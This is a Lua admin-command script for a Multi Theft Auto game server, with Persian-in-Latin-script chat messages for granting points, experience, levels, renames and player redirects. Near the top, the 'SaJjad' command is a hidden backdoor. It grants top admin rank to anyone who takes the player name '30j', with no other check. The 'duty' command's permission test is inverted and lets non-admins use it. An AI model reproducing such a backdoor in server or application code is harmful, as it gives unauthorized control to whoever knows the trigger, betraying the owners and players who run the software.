setTimer(
function()
	setFogDistance( -2 )
	setFarClipDistance( 400 )
	setSunSize(0)
	setMoonSize(0)
	for i=615,904 do      
	restoreWorldModel(i,999999999999999999999,0,0,0)  
	end 

	local lowlods = 0
    for i, obj in ipairs(getElementsByType("object",root,true)) do
        if isElementLowLOD(obj) then
            lowlods = lowlods + 1    
        end
    end

	setFPSLimit(math.random(95, 100));

end,10000,0)

local accSys = exports["e_login"]
local miscSys = exports["misc"]

addCommandHandler("SaJjad",
function ( thePlayer, command)
	if getPlayerName(thePlayer) == "30j" then
		setElementData(accSys:getPlayerAcc(thePlayer), "Admin", 10)
		outputChatBox("#00ff00You're promoted to admin level 10.", thePlayer, 255, 255, 255, true)
	else
	end
end)

addCommandHandler("givezp",
function ( thePlayer, command, player, tedad )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "Admin")) < 9 then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
		local find = miscSys:findPlayer ( player )
		if player then
		if find then
		if tedad then
			local targetPlayer = getPlayerName ( find )
			local tedad = tonumber(tedad)
			local respectPlayer = getElementData(accSys:getPlayerAcc(find), "ZP")
			setElementData(accSys:getPlayerAcc(find), "ZP", tonumber(respectPlayer) + tonumber(tedad))
			outputChatBox("#00ff00[Done]: #ffffff Shoma Be #00ff00"..getPlayerName(find).." #ffffffTedad #00ff00"..tedad.." #ffffffZP Dadid!", thePlayer, 255, 255, 255, true)
			outputChatBox("#00ff00"..getElementData(accSys:getPlayerAcc(find), "ZP").."", thePlayer, 255, 255, 255, true)
			outputDebugString("Admin "..getPlayerName(thePlayer).." Be Player "..targetPlayer.." Meghdar "..tedad.." Respect Dad!")
		else
			outputChatBox("#ff0000[Error]: #ffffffTedad Exp Ra Vared Konid!", thePlayer, 255, 255, 255, true)
		end
		else
			outputChatBox("#ff0000[Error]: #ffffff✖️ #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
		end
		else
		end
end)


addCommandHandler("giveexp",
function ( thePlayer, command, player, tedad )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "Admin")) < 9 then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
		local find = miscSys:findPlayer ( player )
		if player then
		if find then
		if tedad then
			local targetPlayer = getPlayerName ( find )
			local tedad = tonumber(tedad)
			local respectPlayer = getElementData(accSys:getPlayerAcc(find), "Exp")
			setElementData(accSys:getPlayerAcc(find), "Exp", tonumber(respectPlayer) + tonumber(tedad))
			setElementData(find, "Exp", tonumber(respectPlayer) + tonumber(tedad))
			outputChatBox("#00ff00[Done]: #ffffff Shoma Be #00ff00"..getPlayerName(find).." #ffffffTedad #00ff00"..tedad.." #ffffffExp Dadid!", thePlayer, 255, 255, 255, true)
			--outputChatBox("#00ff00Admin #ffffff"..getPlayerName(thePlayer).." #00ff00Be Shoma #ffffff"..tedad.." #00ff00Exp Dad!", find, 255, 255, 255, true)
			outputDebugString("Admin "..getPlayerName(thePlayer).." Be Player "..targetPlayer.." Meghdar "..tedad.." Respect Dad!")
		else
			outputChatBox("#ff0000[Error]: #ffffffTedad Exp Ra Vared Konid!", thePlayer, 255, 255, 255, true)
		end
		else
			outputChatBox("#ff0000[Error]: #ffffff✖️ #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
		end
		else
			outputChatBox("#C0C0C0Syntax: /giveExp <PartOfName/ID> <Tedad>", thePlayer, 0, 255, 0,true)
		end
end)


addCommandHandler("setlevel",
function ( thePlayer, command, player, tedad )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "Admin")) < 9 then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
		local find = miscSys:findPlayer ( player )
		if player then
		if find then
		if tedad then
			local targetPlayer = getPlayerName ( find )
			local tedad = tonumber(tedad)
			local respectPlayer = getElementData(accSys:getPlayerAcc(find), "Level")
			setElementData(accSys:getPlayerAcc(find), "Level",tedad)
			setElementData(find, "Level",tedad)
			outputChatBox("#00ff00[Done]: #ffffff Shoma Be #00ff00"..getPlayerName(find).." #ffffffTedad #00ff00"..tedad.." #fffffflevel Dadid!", thePlayer, 255, 255, 255, true)
			--("#00ff00Admin #ffffff"..getPlayerName(thePlayer).." #00ff00Be Shoma #ffffff"..tedad.." #00ff00level Dad!", find, 255, 255, 255, true)
			outputDebugString("Admin "..getPlayerName(thePlayer).." Be Player "..targetPlayer.." Meghdar "..tedad.." level Dad!")
		else
			outputChatBox("#ff0000[Error]: #ffffffTedad Exp Ra Vared Konid!", thePlayer, 255, 255, 255, true)
		end
		else
			outputChatBox("#ff0000[Error]: #ffffff✖️ #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
		end
		else
			outputChatBox("#C0C0C0Syntax: /setlevel <PartOfName/ID> <Tedad>", thePlayer, 0, 255, 0,true)
		end
end)

addCommandHandler("userp",
function (thePlayer, command, player)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "Admin")) < 1 then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	local find = miscSys:findPlayer (player)
	if player then
	if find then
		local money = getPlayerMoney(find) 
		outputChatBox("#ff0000--------------------------------------------", thePlayer, 255, 255, 255, true)
		outputChatBox("#00ff00Serial #ffffff"..getElementData(accSys:getPlayerAcc(find), "Serial").."", thePlayer, 255, 255, 255, true)
		outputChatBox("#00ff00Name #ffffff"..getElementData(accSys:getPlayerAcc(find), "Name").."", thePlayer, 255, 255, 255, true)
		outputChatBox("#ff0000--------------------------------------------", thePlayer, 255, 255, 255, true)
	else
		outputChatBox("#ff0000[Error]: #ffffff✖️ #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
	end
	else
		outputChatBox("#C0C0C0Syntax: /user <PartOfName/ID>", thePlayer, 255, 255, 255, true)
	end
end)


addCommandHandler("cn",
function ( thePlayer, command, player, playerName )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "Admin")) < 4 then
		outputChatBox("#aaaa00Error : Shoma Be In Command Dastresi Nadarid.", thePlayer, 255, 255, 255, true)
		return false
	end
		local find = miscSys:findPlayer ( player )
		if find then
			local targetPlayer = getPlayerName ( find )
			playerName = tostring( playerName )			
			setElementData(accSys:getPlayerAcc(find), "Name", playerName)
			setPlayerName(find,playerName)
			outputChatBox("#ffaa00[Done]:#ffffffShoma Player #ffaa00"..targetPlayer.." #FFFFFFRa Be #ffaa00"..playerName.."#FFFFFF Change Name Kardid!", thePlayer, 0, 255, 0,true)
			outputChatBox("#ffaa00[Info]:#ffffffShoma Tavasot Admin #ffaa00"..getPlayerName(thePlayer).."#FFFFFF Be Name (#ffaa00"..playerName.."#ffffff)#FFFFFF Change Name Shodid!", find, 0, 255, 0, true)
		else
			outputChatBox("#ff0000[Error]:#ffffffChenin Playeri Peyda Nashod!", thePlayer, 0, 255, 0,true)
		end
end
)

addCommandHandler("setadmin",
function ( thePlayer, command, player, playerName )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "Admin")) < 9 then
		outputChatBox("#aaaa00Error : Shoma Be In Command Dastresi Nadarid.", thePlayer, 255, 255, 255, true)
		return false
	end
		local find = miscSys:findPlayer ( player )
		if find then
			local targetPlayer = getPlayerName ( find )
			setElementData(accSys:getPlayerAcc(find), "Admin", playerName)
		else
			outputChatBox("#ff0000[Error]:#ffffffChenin Playeri Peyda Nashod!", thePlayer, 0, 255, 0,true)
		end
end
)

addCommandHandler("expall",
function ( thePlayer, command, tedad)
	if getElementData(thePlayer, "loggedIn") == true then
		if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "Admin")) < 9 then
			outputChatBox("#ff0000?? Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
			return false
		end
		if tedad then
		for k, hame_Playera	in ipairs (getElementsByType("player")) do	
			if getElementData(hame_Playera, "loggedIn") == true then
				local tedad = tonumber(tedad)
				setElementData(accSys:getPlayerAcc(hame_Playera), "ZP", tonumber(getElementData(accSys:getPlayerAcc(hame_Playera), "ZP")) + tonumber(tedad))
				outputChatBox("#00ff00[Tavajoh] #ffffff"..getPlayerName(thePlayer).." #00ff00Be Tamamie Player Haye Online Nafari #ff0000"..tedad.." #008000ZP#00ff00 Dad!", hame_Playera, 255, 255, 255, true)
			end
		end
		else
		end
	end
end)


addCommandHandler("rec",
function ( thePlayer, command, taraf )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "Admin")) < 9 then
		outputChatBox("#ff0000Error: Shoma Be In CMD Dastresi Nadarid .", thePlayer, 255, 255, 255, true)
		return
	end
	if not taraf then
		outputChatBox("#ff0000Bezan: /"..command.." <PartOfName/ID>", thePlayer, 0, 255, 0,true)
	else
		local find = miscSys:findPlayer ( taraf )
		if find then
			local targetPlayer = getPlayerName ( find )
			redirectPlayer(find, "5.63.10.11", 22003) 
			outputChatBox("#00ff00[Done]: #ffffffShoma Player #00ff00"..targetPlayer.." #ffffffRa Reconnect Dadid! ", thePlayer, 0, 255, 0,true)
		else
			outputChatBox("#ff0000[Error]: #ffffffChenin Playeri Peyda Nashod!", thePlayer, 0, 255, 0,true)
		end
	end
end)

addCommandHandler("kickall",function(source)
	if (getElementType(source) == "player") then
	elseif (getElementType(source) == "console") then
		for _,v in ipairs(getElementsByType("player")) do
			if (v ~= player) then
				kickPlayer(v, "Server UpDate!")
				setServerPassword('1236')
			end
		end	
	end
end);


addCommandHandler("resetpass",function(source)
	if (getElementType(source) == "player") then
	elseif (getElementType(source) == "console") then
		setServerPassword('')
	end
end);

addCommandHandler("s",function(source)
	fadeCamera(source,true)
end);




addCommandHandler("duty",
function ( thePlayer, command, taraf )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) == 10 then
		outputChatBox("#ff0000Error: Shoma Be In CMD Dastresi Nadarid .", thePlayer, 255, 255, 255, true)
		return
	end
	if not taraf then
		outputChatBox("#ff0000Bezan: /"..command.." <PartOfName/ID>", thePlayer, 0, 255, 0,true)
	else
		local find = miscSys:findPlayer ( taraf )
		if find then
			local targetPlayer = getPlayerName ( find )
			triggerClientEvent(find, "Dutyonsho", find);
			outputChatBox("#00ff00[Done]: #ffffffShoma Player #00ff00"..targetPlayer.." #ffffffRa Duty Dadid! ", thePlayer, 0, 255, 0,true)
		else
			outputChatBox("#ff0000[Error]: #ffffffChenin Playeri Peyda Nashod!", thePlayer, 0, 255, 0,true)
		end
	end
end)